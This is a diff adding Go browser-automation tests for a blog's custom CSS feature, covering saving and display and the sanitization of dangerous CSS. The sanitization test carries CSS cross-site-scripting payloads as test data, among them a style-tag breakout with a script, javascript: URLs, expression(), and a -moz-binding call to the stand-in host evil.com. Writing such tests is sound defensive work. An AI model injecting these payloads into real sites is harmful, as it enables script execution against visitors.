@@ -470,3 +470,115 @@ func TestArchivePage(t *testing.T) {
 		t.Errorf("Archive should contain current year %d", currentYear)
 	}
 }
+
+// TestCustomCSS tests the custom CSS feature
+func TestCustomCSS(t *testing.T) {
+	setupTestEnvironment(t)
+	defer cleanup()
+
+	user := createTestUser(t, "styler", "password123")
+
+	// Create a post so we have a public page to check
+	user.createPost(t, "Styled Post", "This post should have custom styles.", true)
+	time.Sleep(200 * time.Millisecond)
+
+	// Navigate to settings and add custom CSS
+	user.navigateToSettings(t)
+	time.Sleep(300 * time.Millisecond) // Wait for page JS to initialize
+
+	// Click on the Appearance tab using JavaScript to avoid interactability issues
+	user.Page.MustEval(`() => document.querySelector('.tab-btn[data-tab="appearance"]').click()`)
+	time.Sleep(200 * time.Millisecond)
+
+	// Add custom CSS using JavaScript
+	user.Page.MustEval(`() => { document.getElementById('customCSS').value = 'body { background-color: #f0f0f0; } .test-class { color: red; }' }`)
+
+	// Save settings by clicking the submit button via JavaScript
+	user.Page.MustEval(`() => document.querySelector('button.btn-cozy[type="submit"]').click()`)
+	user.Page.MustWaitLoad()
+	time.Sleep(200 * time.Millisecond)
+
+	// Verify CSS was saved by checking the field still has the value
+	user.Page.MustEval(`() => document.querySelector('.tab-btn[data-tab="appearance"]').click()`)
+	time.Sleep(200 * time.Millisecond)
+	savedCSS := user.Page.MustEval(`() => document.getElementById('customCSS').value`).String()
+	if !strings.Contains(savedCSS, "background-color: #f0f0f0") {
+		t.Errorf("Expected custom CSS to be saved, got: %s", savedCSS)
+	}
+
+	// Check that CSS appears on the public page
+	publicPage := getPublicPage(t)
+	publicPage.MustNavigate(testBaseURL + "/u/styler/styled-post")
+	publicPage.MustWaitLoad()
+
+	// Get the page HTML and check for the custom CSS in a style tag
+	pageHTML := publicPage.MustHTML()
+	if !strings.Contains(pageHTML, "background-color: #f0f0f0") {
+		t.Error("Custom CSS should appear in the public page HTML")
+	}
+	if !strings.Contains(pageHTML, ".test-class { color: red; }") {
+		t.Error("Custom CSS class should appear in the public page HTML")
+	}
+}
+
+// TestCustomCSSSanitization tests that dangerous CSS content is sanitized
+func TestCustomCSSSanitization(t *testing.T) {
+	setupTestEnvironment(t)
+	defer cleanup()
+
+	user := createTestUser(t, "hacker", "password123")
+
+	// Create a post
+	user.createPost(t, "Hacker Post", "Testing sanitization.", true)
+	time.Sleep(200 * time.Millisecond)
+
+	// Navigate to settings and try to add malicious CSS
+	user.navigateToSettings(t)
+	time.Sleep(300 * time.Millisecond)
+
+	// Click on the Appearance tab using JavaScript to avoid interactability issues
+	user.Page.MustEval(`() => document.querySelector('.tab-btn[data-tab="appearance"]').click()`)
+	time.Sleep(200 * time.Millisecond)
+
+	// Try various XSS attempts via CSS
+	maliciousCSS := `body { color: black; }
+</style><script>alert('xss')</script><style>
+body { background: url(javascript:alert('xss')); }
+div { -moz-binding: url('http://evil.com/xss.xml'); }
+span { behavior: url('script.htc'); }
+p { background: expression(alert('xss')); }`
+
+	user.Page.MustEval(fmt.Sprintf(`() => { document.getElementById('customCSS').value = %q }`, maliciousCSS))
+	user.Page.MustEval(`() => document.querySelector('button.btn-cozy[type="submit"]').click()`)
+	user.Page.MustWaitLoad()
+	time.Sleep(200 * time.Millisecond)
+
+	// Check the public page - malicious content should be stripped
+	publicPage := getPublicPage(t)
+	publicPage.MustNavigate(testBaseURL + "/u/hacker/hacker-post")
+	publicPage.MustWaitLoad()
+
+	pageHTML := publicPage.MustHTML()
+
+	// These dangerous patterns should NOT appear
+	if strings.Contains(pageHTML, "</style><script>") {
+		t.Error("Style tag breakout should be sanitized")
+	}
+	if strings.Contains(pageHTML, "javascript:") {
+		t.Error("JavaScript URLs should be sanitized")
+	}
+	if strings.Contains(pageHTML, "-moz-binding:") {
+		t.Error("-moz-binding should be sanitized")
+	}
+	if strings.Contains(pageHTML, "behavior:") {
+		t.Error("behavior property should be sanitized")
+	}
+	if strings.Contains(pageHTML, "expression(") {
+		t.Error("expression() should be sanitized")
+	}
+
+	// But legitimate CSS should still work
+	if !strings.Contains(pageHTML, "color: black") {
+		t.Error("Legitimate CSS should be preserved")
+	}
+}
